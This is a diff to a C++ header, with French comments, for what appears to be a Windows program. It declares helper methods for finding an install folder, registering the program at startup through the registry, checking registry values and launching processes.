@@ -16,6 +16,8 @@
 
 
 #include "string"
+//Mes fichiers
+#include "Conversion.h"
 #include "Settings.h"
 #include "OperationState.h"
 
@@ -30,12 +32,22 @@ public:
     static bool locationSet();	//installation path
     static bool startupSet();	//demarrage path
     static bool installed();	//installation dans le path
+    static bool directoryExists(const char* dirName);
 
 
     static std::string getInstallFolder();
     static std::string getCurrentPath();
     static std::string getInstallationPath(std::string instFolder);
 
+    static void setLocation();		//
+
+    static void runInstalled();
+
+    static void startProcess(LPCTSTR lpApplicationName, LPTSTR lpArguments);		//starts a process
+
+    static bool setStartup(PCWSTR pszAppName, PCWSTR pathToExe, PCWSTR args);	//registers a program in startup with supplied name, path to exe and startup arguments
+
+    static bool regValueExists(HKEY hKey, LPCSTR keyPath, LPCSTR valueName);	//checks if a certain value exists in the registry
 
 
     //instead of proceeding to the main loop)
